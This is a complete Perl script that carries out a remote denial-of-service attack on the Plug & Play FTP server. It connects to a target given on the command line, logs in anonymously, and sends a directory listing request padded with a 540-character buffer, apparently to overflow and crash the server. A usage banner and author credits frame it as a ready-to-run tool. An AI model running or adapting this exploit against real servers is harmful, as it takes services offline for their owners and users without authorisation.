#!/usr/bin/perl
# ppftpdos.pl - Remote denial of service against Plug & Play FTP server

use Net::FTP;

$host = $ARGV[0];

$buffer = "A"x540;

if("$ARGV[0]" eq "") {
        print("DOS against Plug & Play FTP Server by Bahaa Naamneh\n");
        print("b_naamneh@hotmail.com - http://www.bsecurity.tk\n");
        print("====================================================\n");
        die("Usage : ./PPftpdos <host\/ip>\n");
} else {

        print("Connecting to $host...\n");
        my $ftp = Net::FTP->new($host) or die "Couldn't connect to
$host\n";
        print("Connected!\n");

        $username = "anonymous";
        $password = "anonymous";

        $ftp->login($username, $password)
        or die "Could not log in.\n";

        $ftp->dir($buffer);

        $ftp->quit();

        print("Success!\n");
}

